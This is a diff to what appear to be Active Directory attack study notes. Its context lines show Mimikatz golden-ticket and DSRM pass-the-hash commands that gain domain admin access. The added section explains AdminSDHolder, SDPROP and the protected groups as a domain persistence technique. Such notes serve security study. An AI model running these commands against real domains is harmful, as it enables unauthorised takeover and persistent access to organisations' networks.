@@ -453,3 +453,20 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Now we have the hash of the DSRM administrator account and have changed the logon type, we can use below command to get domain admin privilege.
 - `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<ntlm-hash-got-from-first-one> /run:powershell.exe"'`
 - `ls \\dcorp-dc\c$`
+
+## Domain Persistence Part 4
+- Resides in the System container of a domain and used to control the permissions - using and ACL - for certain built-in privileged groups (called Protected Groups).
+- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+
+**List of Protected Groups**
+- Account Operators
+- Backup Operators
+- Server Operators
+- Print Operators
+- Domain Admins
+- Enterprise Admins
+- Domain Controllers
+- Read-only Domain Controllers
+- Schema Admins
+- Administrators
+- Replicator
